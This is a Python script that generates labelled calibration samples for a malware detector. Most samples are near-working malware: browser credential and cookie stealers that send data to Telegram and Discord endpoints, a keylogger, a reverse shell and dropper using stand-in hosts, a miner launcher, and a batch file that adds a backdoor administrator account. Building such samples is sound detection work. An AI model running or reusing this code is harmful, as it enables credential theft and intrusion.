"""Generate calibration test samples with known threat types.

Each sample is a script that mimics a specific type of malware.
We know the ground truth — so we can verify heuristic accuracy.
"""

import os

SAMPLES_DIR = os.path.join(os.path.dirname(__file__), "samples")
os.makedirs(SAMPLES_DIR, exist_ok=True)

# Ground truth: (filename, expected_type, expected_min_confidence)
GROUND_TRUTH = []


def save(name, content, expected_type, min_confidence):
    path = os.path.join(SAMPLES_DIR, name)
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    GROUND_TRUTH.append((name, expected_type, min_confidence))


# === 1. Pure stealer (Chrome + Telegram exfil) ===
save("stealer_chrome_tg.py", """
import os, base64, requests
chrome = os.path.expanduser("~\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data")
data = open(chrome, "rb").read()
cookies = os.path.expanduser("~\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies")
cdata = open(cookies, "rb").read()
encoded = base64.b64encode(data + cdata)
requests.post("https://api.telegram.org/bot123/sendDocument", files={"document": encoded})
""", "stealer", 0.80)


# === 2. Stealer (multi-browser + Discord + crypto) ===
save("stealer_full.py", """
import os, json, base64, requests
browsers = [
    "~\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data",
    "~\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles",
    "~\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data",
    "~\\\\AppData\\\\Roaming\\\\Opera Software\\\\Opera Stable",
]
discord_path = "~\\\\AppData\\\\Roaming\\\\discord\\\\Local Storage\\\\leveldb"
wallet = "~\\\\AppData\\\\Roaming\\\\Electrum\\\\wallets"
for b in browsers:
    path = os.path.expanduser(b)
    if os.path.exists(path):
        data = open(os.path.join(path, "Default", "Login Data"), "rb").read()
        requests.post("https://discord.com/api/webhooks/123/abc", json={"content": base64.b64encode(data).decode()})
""", "stealer", 0.90)


# === 3. Keylogger ===
save("keylogger_basic.py", """
from pynput import keyboard
import pyautogui, pyperclip, requests

log = []
def on_press(key):
    log.append(str(key))
    if len(log) > 100:
        screenshot = pyautogui.screenshot()
        screenshot.save("/tmp/screen.png")
        clipboard = pyperclip.paste()
        requests.post("https://api.telegram.org/bot123/sendMessage",
                      data={"text": "Keys: " + "".join(log) + " Clip: " + clipboard})
        log.clear()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
""", "keylogger", 0.80)


# === 4. RAT-like (injection + network + persistence) ===
save("rat_stub.py", """
import subprocess, os, socket, urllib.request

# Persistence
os.system('reg add HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v svchost /d "%TEMP%\\\\svchost.exe"')

# Download payload
urllib.request.urlretrieve("http://evil.com/payload.exe", os.environ["TEMP"] + "\\\\svchost.exe")

# Reverse shell
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.0.1", 4444))
while True:
    cmd = s.recv(1024).decode()
    result = subprocess.run(cmd, shell=True, capture_output=True)
    s.send(result.stdout + result.stderr)
""", "rat", 0.70)


# === 5. Dropper (download + execute) ===
save("dropper_simple.py", """
import urllib.request, subprocess, os, base64

url = base64.b64decode("aHR0cDovL2V2aWwuY29tL3BheWxvYWQuZXhl").decode()
path = os.path.join(os.environ["TEMP"], "update.exe")
urllib.request.urlretrieve(url, path)
subprocess.Popen(path)
""", "dropper", 0.60)


# === 6. Miner-like ===
save("miner_config.py", """
import subprocess, os

config = {
    "pool": "stratum+tcp://pool.minexmr.com:4444",
    "wallet": "4ABC123...",
    "worker": os.environ.get("COMPUTERNAME", "worker"),
    "hashrate_target": 1000,
}

subprocess.run(["xmrig.exe", "--url", config["pool"], "--user", config["wallet"],
                "--donate-level", "1", "--threads", "4"])
""", "miner", 0.70)


# === 7. Batch persistence ===
save("persist_batch.bat", """@echo off
reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d "%~dp0loader.exe" /f
schtasks /create /tn "WindowsUpdate" /tr "%~dp0loader.exe" /sc onlogon /rl highest
net user backdoor P@ssw0rd123 /add
net localgroup Administrators backdoor /add
""", "dropper", 0.50)


# === 8. PowerShell downloader ===
save("download_exec.ps1", """
$url = "http://malware.com/stage2.exe"
$path = "$env:TEMP\\svchost.exe"
Invoke-WebRequest -Uri $url -OutFile $path
Start-Process $path
New-Service -Name "WindowsDefenderUpdate" -BinaryPathName $path
""", "dropper", 0.60)


# === 9. Clean Python script ===
save("clean_calculator.py", """
def add(a, b):
    return a + b

def subtract(a, b):
    return a - b

def multiply(a, b):
    return a * b

if __name__ == "__main__":
    print("2 + 3 =", add(2, 3))
    print("10 - 4 =", subtract(10, 4))
    print("5 * 6 =", multiply(5, 6))
""", "clean", 0.0)


# === 10. Clean web server ===
save("clean_flask.py", """
from flask import Flask, render_template, jsonify

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/data")
def get_data():
    return jsonify({"status": "ok", "items": [1, 2, 3]})

if __name__ == "__main__":
    app.run(debug=True, port=5000)
""", "clean", 0.0)


# === 11. Clean config parser ===
save("clean_config.py", """
import json, os

def load_config(path):
    with open(path, "r") as f:
        return json.load(f)

def save_config(path, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=2)

config = load_config("settings.json")
print(f"App: {config.get('name', 'Unknown')}")
""", "clean", 0.0)


# === 12. Obfuscated script (suspicious but not clearly malware) ===
save("obfuscated_unknown.py", """
import base64
exec(base64.b64decode("cHJpbnQoJ2hlbGxvJyk="))
eval(compile(base64.b64decode("cHJpbnQoMSsx").decode(), "<string>", "exec"))
""", "dropper", 0.40)


if __name__ == "__main__":
    print(f"Generated {len(GROUND_TRUTH)} calibration samples:")
    for name, etype, conf in GROUND_TRUTH:
        print(f"  {name:30s} -> {etype:10s} (min conf: {conf:.0%})")
